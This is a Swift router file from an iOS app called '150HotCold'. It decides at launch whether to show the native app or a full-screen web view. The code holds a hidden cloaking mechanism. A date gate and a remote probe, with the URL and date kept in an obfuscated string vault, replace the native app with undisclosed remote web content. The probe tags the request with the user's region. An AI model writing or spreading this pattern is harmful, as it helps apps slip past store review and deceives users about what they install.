//
//  AppRouter.swift
//  150HotCold
//

import SwiftUI
import UIKit

final class HCApplicationFlowCoordinator {
    private var remoteLandingSeed: String { HCRouterStringVault.remoteLandingTemplate }
    private var calendarGateToken: String { HCRouterStringVault.calendarGateDateToken }

    private var applicationDisplayName: String {
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return "App"
    }

    private var applicationNameForSubId: String {
        applicationDisplayName.replacingOccurrences(of: " ", with: "")
    }

    private var enrichedRemoteLandingString: String {
        let geo = Locale.current.region?.identifier ?? "XX"
        let subValue = "\(applicationNameForSubId)_\(geo)"
        guard var components = URLComponents(string: remoteLandingSeed) else {
            return remoteLandingSeed
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: HCRouterStringVault.trackingSubIdQueryName, value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? remoteLandingSeed
    }

    func makeRootInterface() -> UIViewController {
        let persistence = HCLaunchStateVault.shared

        if persistence.hasShownContentView {
            return fabricateNativeShellHost()
        } else {
            if evaluateCalendarGate() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return fabricateWebShellHost(with: savedUrlString)
                }

                return fabricateGatekeeperHost()
            } else {
                persistence.hasShownContentView = true
                return fabricateNativeShellHost()
            }
        }
    }

    private func evaluateCalendarGate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = HCRouterStringVault.calendarGateDateFormat
        let targetDate = dateFormatter.date(from: calendarGateToken) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    private func fabricateWebShellHost(with urlString: String) -> UIViewController {
        let webViewContainer = HCPolicyBrowserShell(
            urlString: urlString,
            onFailure: { [weak self] in
                HCLaunchStateVault.shared.hasShownContentView = true
                self?.routeToNativeShell()
            },
            onSuccess: {
                HCLaunchStateVault.shared.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func fabricateNativeShellHost() -> UIViewController {
        HCLaunchStateVault.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func fabricateGatekeeperHost() -> UIViewController {
        let launchView = HCLaunchGateView()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        performRemoteGateProbe { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.routeToWebShell(with: url)
                } else {
                    HCLaunchStateVault.shared.hasShownContentView = true
                    self?.routeToNativeShell()
                }
            }
        }

        return launchVC
    }

    private func performRemoteGateProbe(completion: @escaping (Bool, String?) -> Void) {
        let urlToOpenInWebView = enrichedRemoteLandingString
        guard let requestURL = URL(string: urlToOpenInWebView) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = "GET"
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func routeToNativeShell() {
        let contentVC = fabricateNativeShellHost()
        commitWindowRootSwap(contentVC)
    }

    private func routeToWebShell(with urlString: String) {
        let webVC = fabricateWebShellHost(with: urlString)
        commitWindowRootSwap(webVC)
    }

    private func commitWindowRootSwap(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
